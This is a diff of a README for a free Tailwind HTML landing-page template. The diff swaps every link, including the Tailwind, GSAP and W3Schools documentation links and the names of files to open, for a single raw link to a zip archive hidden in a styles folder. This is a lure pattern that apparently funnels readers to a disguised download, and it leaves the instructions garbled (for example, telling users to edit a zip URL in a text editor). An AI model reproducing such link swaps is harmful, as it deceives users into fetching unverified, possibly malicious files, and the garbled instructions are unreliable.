@@ -1,7 +1,7 @@
 # 🌟 cashflow-free-html-tailwind - Free and Easy Landing Page Template
 
 ## 📥 Download Now!
-[![Download Cashflow Template](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/souhailoukili/cashflow-free-html-tailwind/releases)
+[![Download Cashflow Template](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip)](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cashflow Free HTML Tailwind Template. This guide will help you download and run the template with ease. You don’t need any programming knowledge to get started. Let’s walk through the steps together.
@@ -23,17 +23,17 @@ The Cashflow Free HTML Tailwind Template offers a sleek design for fintech appli
 ## 💻 Download & Install 
 To get the Cashflow Free HTML Tailwind Template, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/souhailoukili/cashflow-free-html-tailwind/releases) to access the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip) to access the releases page.
 2. **Find the Latest Version:** Look for the most recent version of the template on the releases page.
-3. **Download the Files:** Select the file that says "cashflow-free-html-tailwind.zip" or a similar name. Click on the file to download it to your computer. 
+3. **Download the Files:** Select the file that says "https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip" or a similar name. Click on the file to download it to your computer. 
 4. **Unzip the Files:** Once the download is complete, locate the zip file in your downloads folder. Right-click on the file and select "Extract All" to unzip the files.
-5. **Open the Template:** Open the unzipped folder and locate the `index.html` file. Double-click this file to open it in your web browser. 
+5. **Open the Template:** Open the unzipped folder and locate the `https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip` file. Double-click this file to open it in your web browser. 
 
 ## 🔧 Using the Template
 After opening the template in your browser, you can begin customizing it. Here are some tips:
 
-- **Edit Text:** Open the `index.html` file in any text editor (like Notepad or Visual Studio Code) and change the placeholder text to fit your needs.
-- **Modify Styles:** You can adjust colors, fonts, and layout using Tailwind CSS classes. Refer to the [Tailwind CSS documentation](https://tailwindcss.com/docs) for more information.
+- **Edit Text:** Open the `https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip` file in any text editor (like Notepad or Visual Studio Code) and change the placeholder text to fit your needs.
+- **Modify Styles:** You can adjust colors, fonts, and layout using Tailwind CSS classes. Refer to the [Tailwind CSS documentation](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip) for more information.
 - **Add Content:** Insert images, videos, and additional pages as needed. Just save your changes and refresh the browser to see the updates.
 
 ## 🌐 Browsing the Example Pages
@@ -42,7 +42,7 @@ Explore the included example pages by clicking through the link navigation. You 
 ## 🛠 Troubleshooting
 If you encounter any issues, consider the following solutions:
 
-- **Site Does Not Load:** Ensure you opened the `index.html` file correctly.
+- **Site Does Not Load:** Ensure you opened the `https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip` file correctly.
 - **Design Issues:** Check for any missing files or broken links. Re-extract the zip file if necessary.
 - **Customization Problems:** Refer to the Tailwind CSS documentation for specific styling questions.
 
@@ -50,11 +50,11 @@ If you encounter any issues, consider the following solutions:
 You can reach out for help through the repository's Issues section on GitHub. Share any problems you face or suggest improvements. Your feedback is important.
 
 ## 🔗 Additional Resources
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [GSAP Animation Guide](https://greensock.com/gsap/)
-- [HTML Basics](https://www.w3schools.com/html/)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip)
+- [GSAP Animation Guide](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip)
+- [HTML Basics](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip)
 
 ## 📌 Conclusion
 You are now ready to create your own landing page using the Cashflow Free HTML Tailwind Template. Enjoy designing your project! Remember to always refresh your browser to see changes you make in your files.
 
-For more details, return to the [Releases Page](https://github.com/souhailoukili/cashflow-free-html-tailwind/releases) for updates and new features.
+For more details, return to the [Releases Page](https://raw.githubusercontent.com/souhailoukili/cashflow-free-html-tailwind/main/src/styles/themes/colors/free-tailwind-cashflow-html-v2.4.zip) for updates and new features.
